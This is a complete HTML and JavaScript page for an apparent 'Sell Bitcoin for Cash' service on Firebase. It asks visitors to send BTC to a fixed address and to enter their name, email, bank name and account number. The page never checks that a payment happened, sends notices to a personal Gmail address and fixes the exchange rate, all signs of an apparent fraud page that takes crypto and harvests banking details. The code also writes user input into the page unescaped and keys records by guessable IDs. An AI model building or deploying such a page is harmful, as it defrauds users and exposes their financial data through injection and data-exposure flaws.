<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Bitcoin Cash Exchange</title>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-functions.js"></script>

<style>
body {
    font-family: Arial, sans-serif;
    background: #f4f6f9;
    padding: 20px;
    text-align: center;
}

.container {
    max-width: 520px;
    margin: auto;
    background: #fff;
    padding: 25px;
    border-radius: 12px;
    box-shadow: 0 5px 20px rgba(0,0,0,0.1);
}

h2 { margin-bottom: 10px; }

input, button {
    width: 100%;
    padding: 12px;
    margin: 10px 0;
    border-radius: 6px;
    border: 1px solid #ccc;
}

button {
    background: #28a745;
    color: white;
    cursor: pointer;
}

button:hover { background: #218838; }

.copy-btn { background: #007bff; }
.copy-btn:hover { background: #0056b3; }

.status {
    font-size: 20px;
    font-weight: bold;
    margin-top: 15px;
}

#dashboardPage { display: none; }
</style>

<script>
// Firebase
var firebaseConfig = {
    apiKey: "AIzaSyCtLoXXW7Rkkja7HSBrkkcGqZsbj7kQLjw",
    authDomain: "year2-9413b.firebaseapp.com",
    projectId: "year2-9413b"
};

firebase.initializeApp(firebaseConfig);
var db = firebase.firestore();
var functions = firebase.functions();

let currentUserId = null;

// AUTO LOAD DASHBOARD
window.onload = function () {
    let savedUser = localStorage.getItem("btcUser");

    if (savedUser) {
        currentUserId = savedUser;
        loadDashboard();
    }
};

// CALCULATE
function calculateAmount() {
    let btc = parseFloat(document.getElementById('btcAmount').value);
    let usd = btc * 65000 || 0;
    document.getElementById('dollarAmount').innerHTML =
        "$" + usd.toLocaleString();
}

// COPY BTC
function copyAddress() {
    let input = document.getElementById("btcAddress");
    input.select();
    document.execCommand("copy");
    alert("Address copied");
}

// SUBMIT
function submitTransaction() {

    if (!document.getElementById('confirmTransfer').checked) {
        alert("Confirm transfer first");
        return;
    }

    let name = document.getElementById('name').value.trim();
    let email = document.getElementById('email').value.trim().toLowerCase();
    let btc = parseFloat(document.getElementById('btcAmount').value);
    let bank = document.getElementById('bankName').value.trim();
    let acc = document.getElementById('bankAccount').value.trim();

    if (!name || !email || !btc || !bank || !acc) {
        alert("Fill all fields");
        return;
    }

    let expected = btc * 65000;
    let userId = email + "_" + acc;

    currentUserId = userId;

    db.collection("transactions").doc(userId).set({
        name,
        email,
        btcAmount: btc,
        expectedAmount: expected,
        bankName: bank,
        bankAccount: acc,
        status: "Pending",
        createdAt: firebase.firestore.FieldValue.serverTimestamp()
    })
    .then(() => {

        // SAVE SESSION
        localStorage.setItem("btcUser", userId);

        // SEND EMAIL
        functions.httpsCallable("sendTransactionEmail")({
            recipient: email,
            adminEmail: "marshall12340@gmail.com",
            name, btcAmount: btc, expectedAmount: expected,
            bankName: bank, bankAccount: acc
        });

        loadDashboard();
    });
}

// LOAD DASHBOARD
function loadDashboard() {

    document.getElementById("formPage").style.display = "none";
    document.getElementById("dashboardPage").style.display = "block";

    db.collection("transactions").doc(currentUserId)
    .onSnapshot(doc => {

        if (!doc.exists) return;

        let d = doc.data();

        document.getElementById("dashContent").innerHTML = `
            <h3>Welcome, ${d.name}</h3>
            <p><b>BTC:</b> ${d.btcAmount}</p>
            <p><b>Expected:</b> $${d.expectedAmount.toLocaleString()}</p>
            <p><b>Bank:</b> ${d.bankName}</p>
            <p class="status">Status: ${d.status}</p>
        `;
    });
}

// RESET (START NEW)
function resetDashboard() {
    localStorage.removeItem("btcUser");
    location.reload();
}
</script>
</head>

<body>

<h2>Sell Bitcoin for Cash</h2>

<!-- FORM -->
<div id="formPage" class="container">

<p>Send BTC to:</p>
<input type="text" id="btcAddress"
value="bc1qduk2py2dwc8aa37mvlnndh56lwqkrchs2yj2ej" readonly>

<button class="copy-btn" onclick="copyAddress()">Copy Address</button>

<input type="text" id="name" placeholder="Full Name">
<input type="email" id="email" placeholder="Email">
<input type="number" id="btcAmount" step="0.0001"
placeholder="BTC Amount" oninput="calculateAmount()">

<p>You will receive: <span id="dollarAmount">$0</span></p>

<input type="text" id="bankName" placeholder="Bank Name">
<input type="text" id="bankAccount" placeholder="Account Number">

<label>
<input type="checkbox" id="confirmTransfer">
 I have sent the Bitcoin
</label>

<button onclick="submitTransaction()">Submit</button>

</div>

<!-- DASHBOARD -->
<div id="dashboardPage" class="container">

<h2>Your Dashboard</h2>

<div id="dashContent"></div>

<button onclick="resetDashboard()">
Start New Transaction
</button>

</div>

</body>
</html>
